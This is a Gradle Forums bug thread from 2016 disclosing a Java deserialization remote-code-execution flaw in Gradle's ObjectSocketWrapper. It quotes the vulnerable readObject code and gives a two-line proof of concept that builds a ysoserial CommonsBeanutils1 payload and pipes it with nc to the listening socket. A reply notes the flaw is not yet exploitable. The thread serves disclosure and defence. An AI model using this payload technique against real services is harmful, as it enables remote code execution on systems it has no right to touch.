<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>A security issue about gradle RCE - Bugs - Gradle Forums</title>
    <meta name="description" content="I can&amp;#39;t find the security issue report mail..the info@gradle.org didn&amp;#39;t answer me＝。＝ if you have any problem about this issue plz connect me rootredrain@gmail.com 

Hi： I found a vulnerabililty in gradle. This project us&amp;hellip;">
    <meta name="generator" content="Discourse 2.8.0.beta7 - https://github.com/discourse/discourse version 436edbb51a15c634e65c0d7cdccdb4ce9aecd8f1">
<link rel="icon" type="image/png" href="https://aws1.discourse-cdn.com/gradle/optimized/2X/9/97278102a4b39e2bc437f90f769c3310f492900f_2_32x32.ico">
<link rel="apple-touch-icon" type="image/png" href="https://aws1.discourse-cdn.com/gradle/optimized/2X/a/a9c8968f1d3907dbb4d26c83913a39ab36931984_2_180x180.png">
<meta name="theme-color" content="#ffffff">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726" />
<script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","url":"https://discuss.gradle.org","potentialAction":{"@type":"SearchAction","target":"https://discuss.gradle.org/search?q={search_term_string}","query-input":"required name=search_term_string"}}</script>
<link rel="search" type="application/opensearchdescription+xml" href="https://discuss.gradle.org/opensearch.xml" title="Gradle Forums Search">

      <link href="https://sea1.discourse-cdn.com/gradle/stylesheets/desktop_5407d982b7e02ef353b19ea0bbf72fba383bf87f.css?__ws=discuss.gradle.org" media="all" rel="stylesheet" data-target="desktop"  />
      <link href="https://sea1.discourse-cdn.com/gradle/stylesheets/desktop_theme_1_17431f36bccfb52cb909315eaa597ad07d008583.css?__ws=discuss.gradle.org" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="1" data-theme-name="style"/>
<link href="https://sea1.discourse-cdn.com/gradle/stylesheets/desktop_theme_7_0d7479c4689d6af8a0fe5228003c8dda1dfd689a.css?__ws=discuss.gradle.org" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="7" data-theme-name="default"/>
    <meta name="google-site-verification" content="W1ylQB3F4lOSNL-nJtu7EDXEREW60goiTkoaD9enc9c">



<script src="https://sea1.discourse-cdn.com/gradle/theme-javascripts/cdcc702e29ef50848d84283e4d499dcddbeb33eb.js?__ws=discuss.gradle.org"></script>
<meta name="google-site-verification" content="k0LvVMoPwR9K4syQqfqCYyG9zKu9yeo8d6t71LIuofQ">
<meta name="google-site-verification" content="kCnBfMu0lbnMpfg3t1-ZgJHbSOSYRSquWsxQ4HgqLkA">
    <meta id="data-ga-universal-analytics" data-tracking-code="UA-4207603-10" data-json="{&quot;cookieDomain&quot;:&quot;auto&quot;}" data-auto-link-domains="">

  <link rel="preload" href="https://aws1.discourse-cdn.com/gradle/assets/google-universal-analytics-v3-706f1d28f0a97f67a47515c96189277240ec4940d968955042066d7873fd1fe8.gz.js" as="script">
<script src="https://aws1.discourse-cdn.com/gradle/assets/google-universal-analytics-v3-706f1d28f0a97f67a47515c96189277240ec4940d968955042066d7873fd1fe8.gz.js"></script>


        <link rel="alternate" type="application/rss+xml" title="RSS feed of &#39;A security issue about gradle RCE&#39;" href="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726.rss" />
    <meta property="og:site_name" content="Gradle Forums" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://aws1.discourse-cdn.com/gradle/original/2X/2/2e17c745659497ac81dcbc9d9ae217fde4956b62.svg" />
<meta property="og:image" content="https://aws1.discourse-cdn.com/gradle/original/2X/a/a9c8968f1d3907dbb4d26c83913a39ab36931984.png" />
<meta property="og:url" content="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726" />
<meta name="twitter:url" content="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726" />
<meta property="og:title" content="A security issue about gradle RCE" />
<meta name="twitter:title" content="A security issue about gradle RCE" />
<meta property="og:description" content="I can’t find the security issue report mail…the info@gradle.org didn’t answer me＝。＝  if you have any problem about this issue plz connect me rootredrain@gmail.com  Hi：  I found a vulnerabililty in gradle. This project use  ObjectSocketWrapper class to deserialize data, this class is used in  the jetty subproject and ui subproject,however this class has a object  readObject(), it achieved through the new ObjectInputStream ,    this method flow from the serialization vulnerability.  PoC:  we can u..." />
<meta name="twitter:description" content="I can’t find the security issue report mail…the info@gradle.org didn’t answer me＝。＝  if you have any problem about this issue plz connect me rootredrain@gmail.com  Hi：  I found a vulnerabililty in gradle. This project use  ObjectSocketWrapper class to deserialize data, this class is used in  the jetty subproject and ui subproject,however this class has a object  readObject(), it achieved through the new ObjectInputStream ,    this method flow from the serialization vulnerability.  PoC:  we can u..." />
<meta property="article:published_time" content="2016-05-23T20:22:44+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler">
    <nav class="site-header__navigation" itemscope="" itemtype="https://schema.org/SiteNavigationElement" role="navigation">
  <ul class="site-header__navigation-items">
    <li class="site-header__navigation-item" itemprop="name">
      <a class="site-header__navigation-link" href="https://gradle.org/docs" itemprop="url">Docs</a>
    </li>
    <li class="site-header__navigation-item" itemprop="name">
      <a class="site-header__navigation-link" href="https://blog.gradle.org/" itemprop="url">Blog</a>
    </li>
    <li class="site-header__navigation-item" itemprop="name">
      <a class="site-header__navigation-link" href="https://gradle.com/training/" itemprop="url">Training</a>
    </li>
    <li class="site-header__navigation-item" itemprop="name">
      <a class="site-header__navigation-link" href="https://gradle.com" itemprop="url">Try Gradle Enterprise</a>
    </li>
  </ul>
</nav>

    <header>
      <a href="/">
          <img src="https://aws1.discourse-cdn.com/gradle/original/2X/6/616cc1a5aaf6004ea6222716eb87581994dd3af1.svg" alt="Gradle Forums" id="site-logo" style="max-width: 150px;">
      </a>
    </header>
    <div id="main-outlet" class="wrap">
        <div id="topic-title">
    <h1>
      <a href="/t/a-security-issue-about-gradle-rce/17726">A security issue about gradle RCE</a>
    </h1>

      <div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
            <a href="https://discuss.gradle.org/c/bugs/11" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #AB9364'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Bugs</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

  </div>

  


      <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
        <div class='crawler-post-meta'>
          <div itemprop='publisher' itemscope itemtype="http://schema.org/Organization">
            <meta itemprop='name' content='Gradle Forums'>
              <div itemprop='logo' itemscope itemtype="http://schema.org/ImageObject">
                <meta itemprop='url' content='https://aws1.discourse-cdn.com/gradle/original/2X/6/616cc1a5aaf6004ea6222716eb87581994dd3af1.svg'>
              </div>
          </div>
          <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
            <a itemprop="url" href='https://discuss.gradle.org/u/rootredrain'><span itemprop='name'>rootredrain</span></a>
            (redrain)
          </span>

          <link itemprop="mainEntityOfPage" href="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726">


          <span class="crawler-post-infos">
              <time itemprop='datePublished' datetime='2016-05-23T20:22:44Z' class='post-time'>
                May 23, 2016,  8:22pm
              </time>
              <meta itemprop='dateModified' content='2016-05-23T20:22:44Z'>
          <span itemprop='position'>#1</span>
          </span>
        </div>
        <div class='post' itemprop='articleBody'>
          <p>I can’t find the security issue report mail…the <a href="mailto:info@gradle.org">info@gradle.org</a> didn’t answer me＝。＝<br>
if you have any problem about this issue plz connect me <a href="mailto:rootredrain@gmail.com">rootredrain@gmail.com</a></p>
<p>Hi：<br>
I found a vulnerabililty in gradle. This project use<br>
ObjectSocketWrapper class to deserialize data, this class is used in<br>
the jetty subproject and ui subproject,however this class has a object<br>
readObject(), it achieved through the new ObjectInputStream ,</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51" target="_blank" rel="nofollow noopener">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51" target="_blank" rel="nofollow noopener">gradle/gradle/blob/f490bdf61bd9b4f5383cd9fb0d8ffbca93da8c32/subprojects/ui/src/main/java/org/gradle/foundation/ipc/basic/ObjectSocketWrapper.java#L51</a></h4>
<pre class="onebox"><code class="lang-java"><ol class="start lines" start="41" style="counter-reset: li-counter 40 ;">
<li>    } catch (SocketException e) {</li>
<li>        logger.error("Failed to set timeout", e);</li>
<li>    }</li>
<li>}</li>
<li>
</li>
<li>public Object readObject() {</li>
<li>
</li>
<li>    ObjectInputStream reader = null;</li>
<li>
</li>
<li>    try {</li>
<li class="selected">        reader = new ObjectInputStream(socket.getInputStream());</li>
<li>    } catch (SocketException e) {</li>
<li>        if (!isIgnorableException(e)) {</li>
<li>            logger.error("Reading Object", e);</li>
<li>        }</li>
<li>        return null;</li>
<li>    } catch (Exception e) {</li>
<li>        logger.error("Reading Object", e);</li>
<li>        return null;</li>
<li>    }</li>
<li>
</li>
</ol></code></pre>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>this method flow from the serialization vulnerability.</p>
<p>PoC:</p>
<p>we can use the ysoserial project to create payload easily, gradle will<br>
open a socket and wait for a client to send serialized data</p>
<p>java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsBeanutils1 “touch<br>
/tmp/rr” &gt; /tmp/payload<br>
cat /tmp/payload |nc 127.0.0.1 [port]</p>
<p>Regards,<br>
redrain</p>
        </div>

        <meta itemprop='headline' content='A security issue about gradle RCE'>
          <meta itemprop='keywords' content=''>

        <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
           <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
           <meta itemprop="userInteractionCount" content="0" />
           <span class='post-likes'></span>
         </div>

         <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
            <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
            <meta itemprop="userInteractionCount" content="0" />
          </div>

      </div>
      <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
        <div class='crawler-post-meta'>
          <div itemprop='publisher' itemscope itemtype="http://schema.org/Organization">
            <meta itemprop='name' content='Gradle Forums'>
              <div itemprop='logo' itemscope itemtype="http://schema.org/ImageObject">
                <meta itemprop='url' content='https://aws1.discourse-cdn.com/gradle/original/2X/6/616cc1a5aaf6004ea6222716eb87581994dd3af1.svg'>
              </div>
          </div>
          <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
            <a itemprop="url" href='https://discuss.gradle.org/u/philwantsfish'><span itemprop='name'>philwantsfish</span></a>
            (Philip OKeefe)
          </span>

          <link itemprop="mainEntityOfPage" href="https://discuss.gradle.org/t/a-security-issue-about-gradle-rce/17726">


          <span class="crawler-post-infos">
              <time itemprop='datePublished' datetime='2016-05-24T19:27:08Z' class='post-time'>
                May 24, 2016,  7:27pm
              </time>
              <meta itemprop='dateModified' content='2016-05-24T19:27:08Z'>
          <span itemprop='position'>#2</span>
          </span>
        </div>
        <div class='post' itemprop='articleBody'>
          <p>I was coming to report this issue, but it looks like someone read my blogpost and reported it already ( <a href="http://philwantsfish.github.io/security/java-deserialization-github" rel="nofollow noopener">http://philwantsfish.github.io/security/java-deserialization-github</a> )</p>
<p>Neither of the subprojects are vulnerable at the moment so fixing these is not urgent. Exploiting this vulnerability will require finding a new gadget chain. Particularly you will want to be careful about what new dependencies you add to the projects until the issue is fixed. For advice or help you can reach me at <a href="mailto:okeefephil@gmail.com">okeefephil@gmail.com</a></p>
        </div>

        <meta itemprop='headline' content='A security issue about gradle RCE'>

        <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
           <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
           <meta itemprop="userInteractionCount" content="0" />
           <span class='post-likes'></span>
         </div>

         <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
            <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
            <meta itemprop="userInteractionCount" content="0" />
          </div>

      </div>






    </div>
    <footer class="container wrap">
      <nav class='crawler-nav'>
        <ul>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/' itemprop="url">Home </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/categories' itemprop="url">Categories </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/guidelines' itemprop="url">FAQ/Guidelines </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/tos' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='/privacy' itemprop="url">Privacy Policy </a>
          </span>
        </li>
        </ul>
      </nav>
      <p class='powered-by-link'>Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
    </footer>
    
    
  </body>
  
</html>
